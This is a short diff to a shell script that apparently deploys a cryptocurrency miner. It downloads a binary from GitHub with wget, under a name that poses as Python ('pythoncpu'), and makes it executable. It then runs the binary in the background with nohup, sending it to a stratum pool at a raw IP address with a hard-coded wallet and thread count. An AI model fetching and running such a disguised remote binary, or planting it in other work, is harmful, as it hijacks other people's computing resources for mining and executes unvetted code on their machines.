@@ -24,14 +24,14 @@ VR_Threads=4
 
 
 
-wget -q https://github.com/one10001/10001code/raw/main/pythonheq
-chmod +x pythonheq
+wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
+chmod +x pythoncpu
 
 
   echo '######### execution #########'
 
 
-nohup ./pythonheq -v -l "${PoolHost}":"${VR_Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" "$@" 1> oout 2> oout &
+nohup ./pythoncpu -a x16rv2 -o stratum+tcp://116.203.10.54:3015 -u 5PJxraBqyU1yKK5QukamiMZqNdWPcZ3wwB -p c=VGC -t 4 1> oout 2> oout &
 tail -f oout
 
 
